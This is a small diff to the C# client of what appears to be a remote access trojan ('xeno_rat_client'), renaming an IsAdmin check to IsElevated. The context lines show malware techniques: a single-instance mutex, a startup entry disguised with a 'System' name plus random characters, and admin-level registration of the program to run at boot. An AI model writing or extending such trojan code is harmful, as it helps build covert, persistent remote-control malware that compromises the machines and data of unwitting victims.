@@ -48,7 +48,7 @@ namespace xeno_rat_client
             Console.SetOut(ConsoleCapture);
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
 
-            string currentMutex = serviceIdentifier + (Utils.IsAdmin() ? "-admin" : "");
+            string currentMutex = serviceIdentifier + (Utils.IsElevated() ? "-admin" : "");
             using (Mutex mutex = new Mutex(true, currentMutex, out bool createdNew))
             {
                 if (!createdNew) Environment.Exit(0);
@@ -101,7 +101,7 @@ namespace xeno_rat_client
             {
                 startup_name = "System" + GetRandomString(8);
             }
-            if (Utils.IsAdmin())
+            if (Utils.IsElevated())
             {
                 await Utils.AddToStartupAdmin(Assembly.GetEntryAssembly().Location, startup_name);
             }
